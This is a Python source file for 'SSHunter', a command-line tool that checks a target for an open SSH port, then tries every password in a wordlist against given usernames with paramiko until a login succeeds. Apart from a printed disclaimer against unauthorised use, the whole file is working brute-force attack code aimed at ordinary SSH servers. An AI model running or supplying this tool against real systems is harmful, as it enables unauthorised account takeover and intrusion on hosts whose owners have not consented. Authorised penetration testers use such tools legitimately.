import paramiko
import pyfiglet
import socket
import logging
import argparse
from colorama import Fore, Style
from time import sleep

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

fg = Fore.GREEN
fr = Fore.RED
fb = Fore.CYAN

bold = Style.BRIGHT

f_reset = Style.RESET_ALL

class Config:
    def __init__(self) -> None:      
        self.parser = argparse.ArgumentParser()
        self.setup_arguments()

    def setup_arguments(self):
        self.parser.add_argument('-hs', '--host', required=True,
                        help='Target HOST: 192.168.0.1')
        self.parser.add_argument('-l', '--username')
        self.parser.add_argument('-w', '--wordlist',
                                help='Wordlist file for fuzzing')
        self.parser.add_argument('-p', '--port')
        self.parser.add_argument('-v', '--verbose', required=False, action='store_true')

    def parse_args(self):
        return self.parser.parse_args()


class HostCheck:
    def __init__(self, host) -> None:
        self.host = host
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        pass


    def check_host(self):
        ssh_common_ports = [22, 2222]
        for port in ssh_common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    result = sock.connect_ex((self.host, port))
                    if result == 0:
                        service_name = socket.getservbyport(port)
                        if service_name == 'ssh':
                            return port, True
            
            except socket.error:
                pass

        return False


class Sshunter:
    def __init__(self, host, wordlist, username, port, verbose) -> None:
        self.host = host
        self.wordlist = wordlist
        self.ssh = paramiko.SSHClient()
        self.username = username.split(',')
        self.port = port
        self.verbose = verbose
        pass

    def banner(self):
        autor = 'Pixel.Def'
        version = 'v1'

        disclaimer1 = '[+] Warning: This is SSH bruteforce testing software, do not use it without prior permission because this is an illegal action.'
        disclaimer2 = 'Use only in authorized environments and that have full control, I am not responsible for misuse of the application.\n'

        default_font = 'cricket'

        print('\n')
        banner = pyfiglet.Figlet(font=default_font)
        print(banner.renderText('SSHunter'))
        print(f'{version} ------- Made By {autor}')
        print('-' * 50, '\n')
        print('-' * 50, '\n')
        print(disclaimer1)
        print(disclaimer2)
        sleep(2)


    def read_wordlist(self):
        print('[+] Generating Wordlist!\n')
        sleep(2)
        with open(self.wordlist, 'rb') as file:
            payloads = [line.decode('utf-8').strip() for line in file.readlines()]

        return payloads
    
    def sshunter(self):
        self.banner()

        payloads = self.read_wordlist()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print(f'[+] Attacking Target on Host: {self.host} {self.port}\n')
        for payload in payloads:
            for uname in self.username:
                try:
                    self.ssh.connect(self.host, username=uname, password=payload, port=self.port)
                except paramiko.AuthenticationException:
                    if self.verbose:
                        logging.warning(f'Access Denied on Host! {self.host}: {bold}{fr}{uname}{f_reset}:{bold}{fr}{payload}{f_reset}')
                    pass
                except paramiko.ssh_exception.SSHException as e:
                    pass
                except EOFError as e:
                    pass
                
                except KeyboardInterrupt:
                    print('[+] App Aborted!')
                    exit(1)

                else:
                    logging.warning(f'Password Found: - {self.host} - {bold}{fg}{uname}{f_reset}:{bold}{fg}{payload}{f_reset}')
                    return
                
            self.ssh.close()

        logging.warning('[+] Password Not Found!')
        exit(1)


def args_manager():
    config = Config()
    args = config.parse_args()

    return args


def is_verbose(args):
    if args.verbose:
        return True

    return False


def check_host(host):
    check_ssh_is_on = HostCheck(host)
    port, is_on = check_ssh_is_on.check_host()
    return port, is_on


def main():
    args = args_manager()
    host = args.host
    username = args.username
    wordlist = args.wordlist
    port = args.port

    ssh_port, ssh_is_on = check_host(host)
    
    if not port is None:
        ssh_port = port 

    if not ssh_is_on:
        print('[+] Port SSH is closed!')
        return

    verbose = is_verbose(args)

    sshunter = Sshunter(host, wordlist, username, ssh_port, verbose)
    sshunter.sshunter()

if __name__ == '__main__':
    main()